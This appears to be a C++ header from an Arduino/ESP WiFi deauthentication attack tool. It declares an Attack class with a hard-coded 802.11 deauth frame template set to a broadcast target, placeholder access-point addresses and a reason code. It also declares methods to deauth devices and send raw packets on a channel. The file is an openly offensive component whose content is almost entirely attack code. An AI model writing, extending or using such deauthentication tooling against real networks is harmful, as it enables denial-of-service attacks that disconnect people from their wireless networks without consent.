#pragma once
#ifndef ATTACK_H
#define ATTACK_H

#include <Arduino.h>
#include <WiFi.h>
#include <scan.h>


class Attack
{
private:

    unsigned long lastPacketTime = 0;
    unsigned long curentPacketTime = 0;
    float lastPacketSpeed = 0;
    float curentPacketSpeed = 0;

    uint8_t deauthedDevice = 0;

	uint16_t packetSize = 0;
    uint8_t deauthPacket[26] = {
        /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
        /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
        /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
        /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
        /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
        /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
        /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
};

public:

	bool deauth_attack = false;
	void deauthUpdate();
	bool deauthDevice(uint8_t num);
	bool sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t ch);

};




extern Attack attack;

#endif